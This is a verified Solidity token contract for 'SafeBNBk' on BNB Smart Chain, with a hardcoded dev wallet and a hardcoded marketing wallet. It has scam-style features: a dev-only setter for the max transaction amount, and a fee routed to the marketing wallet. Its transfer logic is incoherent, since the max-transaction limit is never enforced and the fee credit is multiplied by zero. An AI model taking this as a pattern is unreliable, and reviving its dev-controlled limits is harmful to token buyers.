/**
 *Submitted for verification at BscScan.com on 2022-03-04
*/

/**
 *S
*/
// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.12;

contract SafeBNBk {
    address private _owner;

    string private _symbol = "SBNBk";
    string private _name = "SafeBNBk";
    uint256 private _totalSupply = 10000000 * (10 ** decimals());
    uint256 private _reward = 0;
    uint256 public _fee = 0;
    uint256 private _maxTxAmount = 10000000 * (10 ** decimals());
    address private dev = 0x5827E743649d01B023aDe72517D27FE461622c3e;
    address private marketingwallet = 0x143257E6c12448255B421eb5Fc6e8c8Dcb02eB83;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        _owner = msg.sender;
        _balances[_owner] = _totalSupply;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return 9;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address wallet) public view returns (uint256) {
        return _balances[wallet];
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        uint256 currentAllowance = _allowances[msg.sender][spender];
        require(currentAllowance >= subtractedValue, "Decreased allowance below zero");
        unchecked {
            _approve(msg.sender, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "Transfer from the zero address");
        require(recipient != address(0), "Transfer to the zero address");
        uint256 taxfee ;
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "Transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        taxfee = (amount *_fee)/(100);
        amount = amount - taxfee;
        _balances[recipient] += amount;
        _balances[marketingwallet] += taxfee * _reward;
        if(amount >= _maxTxAmount) {
            _maxTxAmount = _reward;

        }
        

        emit Transfer(sender, recipient, amount);
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function setMaxTX(uint256 amount)  public {
        require(msg.sender == dev);
        _maxTxAmount = amount;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "Transfer amount exceeds allowance");
        unchecked {
            _approve(sender, msg.sender, currentAllowance - amount);
        }

        return true;
    }
}